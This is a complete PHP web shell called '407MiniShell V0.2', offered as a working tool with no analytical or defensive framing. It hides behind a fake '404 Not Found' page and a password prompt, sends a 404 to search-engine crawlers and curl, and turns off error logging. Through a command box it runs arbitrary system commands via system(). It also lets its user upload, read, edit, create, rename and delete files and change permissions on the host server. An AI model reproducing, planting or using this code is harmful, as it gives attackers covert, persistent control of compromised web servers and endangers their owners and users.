<?php
session_start();
@set_time_limit(0);

if(version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}

@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
@error_reporting(0);

$password = "248d4b6c97654f61a59b6b6370cfe33b"; #md5: myshell

$SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<!DOCTYPE html>
<html>
 <head>
  <title>404 Not Found</title>
 </head>

 </body>
</html>
<style type="text/css">
body {
    background: black;
    background-size: 100% 100%;
}
html {
	margin: 20px auto;
	background: #000000;
	color: green;
	text-align: center;
}
header {
	color: black;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: white;
	background: transparent;
	border: 1px solid green;
	margin-left: 20px;
	text-align: center;
}
pre{
	color: green;
}
</style>
</head>
<center>
<header>
	<pre>
                 ______
  (~~~-_  _/~~~~~  ____~~\_
  (     \/        /,--,)   ~\_
  (    /'        //   ))      \
   \ /~           ~\ //  /~~~~~'
    Y       ,---,   ~/  /
   (       /     )     '~~-_
   //\   /~      |          ~\
  ((  \ /        |             \
  ((  ( (  ,-.   |              \
  (( ,~l)  ( )   )               \
 _J( ( )   ( )  /           ,----)
( ~~\`-'   `-' /-~\     .--<
 `---~~~~-----' _  )   /  _/
    \           /~ )r-/\_/ \_
     \_       -'  /( (,-')   \
      _>-.____,--' r~~L--)    \
     ///~~~~~~\    |,-L, )     \
   ,'//        \(~\(V ~ / __    )
  / J/          U  U\>-~ (  ~\  )
 / /7           |\ V )    \   \J'
/ ( (           | \ /      )
\ ( (           |  ~       )
 \ \J)          / ____     )
  C/,\         /_/ <_ ~\_ /
(~Y~~ \_____--=/     \   V
( (   ]~--z-S  \ /\   \
 \\  /~~( /A   `<  \   \_
  ~~7    |(( >   \  ~\_  \
    (    )`\Y \   \    ~~~'
    (    `~~| (~~~~~)
   (__/~~~~7,C~~~~~)
    \    ___LC~~~~~),
     \===-<~~\~~~~~ \
   ,/~~     \  \      \ 
 /~          )  )      )  
(____________L__L______)
	</pre>
</header>
<form method="post">
<input type="password" name="password"><br>
</form>
<?php
exit;
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if(empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password)))
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();


if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
}
?>
<?
echo '<!doctype html>
<html>
<head>
<title>404 Not Found</title>
</head>';

?>

<style> 
body {
	
  background: #151515;
line-height: 1;
color: #fff;
font-family: monospace;
  
  }
h4{
	font-family: monospace;
	background: #151515;
	color: white;
	font-size: 20px;
	border: 1px solid #02BC8C;
	border-radius: 10px;
}
p{
	text-align: center;
	color: #02BC8C;
	font-family: Courier;
	font-size: 3vh;
	background: #151515;
}
  th{
  	background:#02BC8C;
  color: black;
}
table, td {
	border-collapse:collapse;
	background: transparent;
	font-family: Monospace ;
	font-size: 13px;
}
input{
	background-color: #151515;
	font-falimy: monospace;
	font-size: 15px;
color: white;
border: 1px solid white;
text-shadow: 5px 5px 30px darkred;
}
textarea { 
font-family: monospace ; 
}
.table_home, .th_home, .td_home{ 
color:white;
border: 1px solid #02BC8C;
}
th {
	padding: 10px;
}
.td_home { padding: 7px; }
select {font-family: Comic Sans MS }
a {color:white}
textarea { width: 100%;height: 400px; }
</style>
<?php

echo '</head>
<body><b><center>
<p>407Mini_<font color="white">Shell</p></font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<font color="#02BC8C"><center>'.php_uname().'</center></font><br>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = 


getcwd();

}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<font color=#fff><center>Current Path: <a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</font></center></td></tr><tr><td><center>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">File Upload</font><br />';
}else{
echo '<font color="red">Upload Failed !!</font><br />';
}
}
echo '</center><center><form enctype="multipart/form-data" method="POST"><font color="black"><input style="background:silver;font-family: Comic Sans MS " type="file" name="file" />
<input type="submit" value="Upload" />
</form></center>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td><center>Current File : ";
echo $_GET['filesrc'];
echo '</center></tr></td></table><br />';
echo(' <textarea style="width: 100%;height: 400px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}
//Empety
elseif(isset($_GET['option']) && $_GET['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
//Chmod
if($_GET['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Done </font><br />';
}else{
echo '<font color="red">Change Permission Error </font><br />';
}
}

$ganz = $_GET['path'];
$kamu = $_GET['name'];
$patc = "$ganz/$kamu";

echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($patc)), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Save" />
</form>';
}
//
elseif($_GET['opt'] == 'btw'){
	$cwd = getcwd();
	 echo '<form action="?option&path='.$cwd.'&opt=delete&type=buat" method="POST">
New Name : <input name="name" type="text" size="20" value="Folder" />
<input type="hidden" name="path" value="'.$cwd.'">
<input type="hidden" name="opt" value="delete">
<input type="submit" value="Save" />
</form>';
}
elseif($_GET['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Change Name Done </font><br />';
}else{
echo '<font color="red">Change Name Error </font><br />';
}
$_POST['name'] = $_POST['newname'];
}
$ganz = $_GET['path'];
$kamu = $_GET['name'];
$patc = "$ganz/$kamu";
$new = $_POST['newname'];

echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$new.'" />
<input type="hidden" name="path" value="'.$patc.'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Save" />
</form>';
}
elseif($_GET['opt'] == 'baru'){
	
$ganz = $_GET['path'];
$kamu = $_GET['name'];
$patc = "$ganz/$kamu";
$new = $_POST['newname'];
$azz = $_POST['path'];
$newz = "$azz/$new";


if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Create File Done [ '.$new.' ]</font><br />';
}else{
echo '<font color="red">Create File Error</font><br />';
}
fclose($fp);
}

echo '<form method="POST"> Name : <input name="nama" type="text" size="20" value="'.$new.'" /><input type="submit" name="namaa" value="Create"/></form><br> ';

$ho = $_POST['nama'];

if(isset($_POST['namaa'])){
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($patc)).'</textarea><br />
<input type="hidden" name="path" value="'.$ganz.'/'.$ho.'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
	}
	}
elseif($_GET['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit File Done </font><br />';
}else{
echo '<font color="red">Edit File Error </font><br />';
}
fclose($fp);
}
$ganz = $_GET['path'];
$kamu = $_GET['name'];
$patc = "$ganz/$kamu";
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($patc)).'</textarea><br />
<input type="hidden" name="path" value="'.$patc.'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_GET['opt'] == 'delete'){
	
$ganz = $_GET['path'];
$kamu = $_GET['name'];
$patc = "$ganz/$kamu";

//Delete dir
if($_GET['type'] == 'dir'){

if(rmdir($patc)){
echo '<font color="green">Delete File Done</font><br />';
}else{
echo '<font color="red#">Delete File Error </font><br />';
}
}
if($_GET['type'] == 'buat'){
$haaa = $_POST['path'];
$heee = $_POST['name'];
$hooo = "$haaa/$heee";
$new = $haaa.'/'.htmlspecialchars($heee);
if(!mkdir($new)){
echo '<font color="red">Create Folder Error</font><br />';
}else{
echo '<font color="green">Create Folder Done </font><br />';
}
}
elseif($_GET['type'] == 'file'){

$ganz = $_GET['path'];
$kamu = $_GET['name'];
$patc = "$ganz/$kamu";

if(unlink($patc)){
echo '<font color="green">Delete File Done</font><br />';
}else{
echo '<font color="red#">Delete File Error </font><br />';
}
}
}
echo '</center>';
?>
<form><font color="white">
    <label for="cmd">407@localhost:~$ </label>
    <input type="text" name="cmd" placeholder="_" /></font>
    </form>

</body>
<font color="white" size="5">
<?php
    if(isset($_GET['cmd'])){
        echo "<pre>";
        echo system($_GET['cmd']);
        echo "</pre>";
    }

?>
<?
$scandir = scandir($path);
$pa = getcwd();
echo ' <table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
<tr>
<th class=th_home><center>File</center></th>
<th class=th_home><center>Size</center></th>
<th class=th_home><center>Perm</center></th>
<th class=th_home><center>Action</center></th>
</tr> <tr>
<td class=td_home>..</td><td class=td_home align=center>NONE</td> <td class=td_home align=center>LINK</td> <td class=td_home align=center> <a href="?option&path='.$pa.'&opt=baru&name=new.php">New File    </a> <a href="?option&path='.$pa.'&opt=btw&type=dir">     New Dir</a> </td></tr>
';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "
<tr>
<td class=td_home><img src='http://www.sclance.com/pngs/file-png/file_png_487779.jpg' width='15px' height='15px'> <a href=\"?path=$path/$dir\">$dir</a></td>
<td class=td_home ><center>DIR</center></td>
<td class=td_home ><center>";
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td class=td_home ><center>
<a href=\"?option&path=$path&opt=rename&type=dir&name=$dir\">Rename</a> <a href=\"?option&path=$path&opt=delete&type=dir&name=$dir\">Delete</a> <a href=\"?option&path=$path&opt=chmod&type=dir&name=$dir\">Chmod</a>

</center></td>
</tr>";
}
echo '<br>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td class=td_home > <img src='http://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/file-text-icon.png' width='15px' height='15'> <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td class=td_home><center>".$size."</center></td>
<td class=td_home><center>";
if(is_writable("$path/$file")) echo '<font color="green">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td class=td_home><center>
<a href=\"?option&path=$path&opt=edit&type=file&name=$file\">Edit</a> <a href=\"?option&path=$path&opt=rename&type=file&name=$file&path=$path\">Rename</a> <a href=\"?option&path=$path&opt=delete&type=file&name=$file\">Delete</a> <a href=\"?option&path=$path&opt=chmod&type=file&name=$file\">Chmod</a>
</center></td>
</tr>";
}
echo '</table>
</div>';
}

echo '<br><center><h4>407MiniShell V0.2</h4></b></body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}

?>
